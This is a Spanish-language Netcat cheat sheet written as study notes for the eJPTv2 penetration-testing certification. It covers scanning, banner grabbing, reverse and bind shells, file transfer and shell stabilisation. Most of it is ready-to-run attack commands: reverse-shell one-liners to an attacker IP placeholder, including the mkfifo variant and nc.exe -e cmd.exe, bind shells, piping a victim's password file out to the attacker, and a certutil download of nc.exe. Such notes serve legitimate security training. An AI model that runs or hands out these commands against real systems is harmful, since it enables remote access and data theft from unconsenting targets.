# Netcat

**Descripción:** Notas enfocadas exclusivamente al uso práctico de Netcat para la certificación eJPTv2. Incluye escaneo, enumeración, shells (Reverse/Bind) y transferencia de archivos.

---

# **1. Sintaxis y flags**

| Flags | Descripción | Contexto eJPT |
| --- | --- | --- |
| `-n` | **No** resolución DNS | Siempre úsalo para velocidad y sigilo básico. |
| `-v` | Verbose (Detallado) | Útil para ver cuando se establece una conexión. |
| `-l` | Listen (Escuchar) | Convierte a nc en un servidor (para recibir shells). |
| `-p` | Port (Puerto) | Especifica el puerto local o remoto. |
| `-e` | Execute (Ejecutar) | Ejecuta un programa tras la conexión (ej: `/bin/bash` o `cmd.exe`). **OJO:** No siempre disponible. |
| `-u` | UDP | Cambia el modo a UDP (por defecto es TCP). |
| `-z` | Zero-I/O | Modo escaneo, no establece conexión completa. |

# **2. Escaneo de Puertos y Banner Grabbing**

Aunque **Nmap** es el rey, Netcat es útil para escaneos rápidos o cuando no hay herramientas instaladas en la máquina víctima (pivoting).

### Escaneo TCP Connect

```bash
nc -nvv -w 1 -z <IP_VICTIMA> 1-1000
```

- `w 1`: Timeout de 1 segundo

### Escaneo UDP

```bash
nc -nv -u -z -w 1 <IP_VICTIMA> 1-1000
```

### Banner Grabbing

```bash
nc -nv <IP_VICTIMA> <PUERTO>
```

**Tip:** En puerto 80 escribe:

```
HEAD / HTTP/1.0
```

y pulsa Enter dos veces.

# **3. Reverse Shells (Prioridad en eJPT)**

La mayoría de escenarios del examen requieren **reverse shell** para evadir firewalls.

### Atacante (Kali)

```bash
nc -nlvp 4444
```

### Víctima

### Linux (con `-e`)

```bash
nc -e /bin/bash <TU_IP_KALI> 4444
```

### Linux (sin `-e`, OpenBSD)

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <TU_IP_KALI> 4444 >/tmp/f
```

### Windows

```bash
nc.exe -e cmd.exe <TU_IP_KALI> 4444
```

# **4. Bind Shells**

Útil si la víctima **no tiene salida a internet**, pero acepta conexiones entrantes.

### Víctima

```bash
# Linux
nc -nlvp 4444 -e /bin/bash

# Windows
nc.exe -nlvp 4444 -e cmd.exe
```

### Atacante

```bash
nc -nv <IP_VICTIMA> 4444
```

# **5. Transferencia de Archivos**

Clave para subir herramientas o exfiltrar datos.

## Subir archivo a la víctima (NetCat)

**Víctima**

```bash
nc -nlvp 4444 > linpeas.sh
```

**Atacante**

```bash
nc -nv <IP_VICTIMA> 4444 < linpeas.sh
```

## Descargar archivo de la víctima

**Atacante**

```bash
nc -nlvp 4444 > password_robado.txt
```

**Víctima**

```bash
nc -nv <TU_IP_KALI> 4444 < password.txt
```

> Netcat no muestra progreso. Cancela con Ctrl+C al finalizar.
> 

## Subir archivo a la víctima (HTTP)

En caso de no tener netcar en la víctima, montaremos un servidor web nosotros con el archivo

**Atacante:**

- `cd /usr/share/windows-binaries`  # Aquí dentro tendremos el ansiado nc.exe y otros
- `python -m SimpleHTTPServer 80`    # Montamos servidor

**Víctima:**

- `certutil -urlcache -f http://ip-atacante/nc.exe nc.exe`  # Descargamos archivo

# **6. Estabilización de Shell (Upgrade TTY)**

Haz esto nada más obtener una shell en Linux.

### Spawnear TTY

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# o
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Exportar terminal

```bash
export TERM=xterm
```